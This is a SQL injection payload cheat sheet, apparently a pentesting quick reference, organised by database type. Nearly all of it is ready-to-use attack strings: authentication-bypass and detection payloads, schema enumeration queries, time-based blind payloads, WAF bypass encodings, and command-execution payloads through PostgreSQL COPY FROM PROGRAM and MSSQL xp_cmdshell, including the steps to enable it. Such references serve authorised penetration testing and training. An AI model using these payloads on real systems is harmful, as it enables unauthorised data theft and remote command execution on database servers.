# SQLi Payloads

Quick reference by database type.

## Detection

```sql
'
''
`
``
,
"
""
/
//
\
\\
;
' or '1'='1
' or ''='
' or 1=1--
" or 1=1--
or 1=1--
' or 'x'='x
' AND '1'='1
' AND '1'='2
1' ORDER BY 1--
1' ORDER BY 10--
```

## MySQL

### Version / User

```sql
SELECT @@version
SELECT user()
SELECT current_user()
SELECT system_user()
```

### Database Enumeration

```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema='db_name'
SELECT column_name FROM information_schema.columns WHERE table_name='table_name'
```

### String Concatenation

```sql
CONCAT('a','b')
'a' 'b'
```

### Comments

```sql
-- comment
# comment
/* comment */
/*! MySQL specific */
```

### Time-based Blind

```sql
SLEEP(5)
BENCHMARK(10000000,SHA1('test'))
```

## PostgreSQL

### Version / User

```sql
SELECT version()
SELECT current_user
SELECT session_user
```

### String Concatenation

```sql
'a' || 'b'
CONCAT('a','b')
```

### Time-based Blind

```sql
pg_sleep(5)
```

### RCE (Superuser)

```sql
COPY (SELECT 'test') TO '/tmp/test.txt'
CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';
```

## MSSQL

### Version / User

```sql
SELECT @@version
SELECT user_name()
SELECT SYSTEM_USER
```

### Database Enumeration

```sql
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='table_name')
```

### String Concatenation

```sql
'a' + 'b'
CONCAT('a','b')
```

### Time-based Blind

```sql
WAITFOR DELAY '0:0:5'
```

### Stacked Queries / xp_cmdshell

```sql
; EXEC xp_cmdshell 'whoami'--
; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

## Oracle

### Version / User

```sql
SELECT banner FROM v$version
SELECT user FROM dual
```

### String Concatenation

```sql
'a' || 'b'
CONCAT('a','b')
```

### Time-based Blind

```sql
dbms_pipe.receive_message(('a'),5)
```

## SQLite

### Version

```sql
SELECT sqlite_version()
```

### Tables

```sql
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE type='table' AND name='table_name'
```

## WAF Bypass

```sql
/*!50000SELECT*/ @@version
SeLeCt
%53%45%4c%45%43%54 (URL encoded)
concat(0x73,0x65,0x6c,0x65,0x63,0x74)
1'/**/OR/**/1=1--
```

---

!!! info "Need more context?"
    For full methodology, use [sqlmap](https://sqlmap.org) or see dedicated SQLi guides.
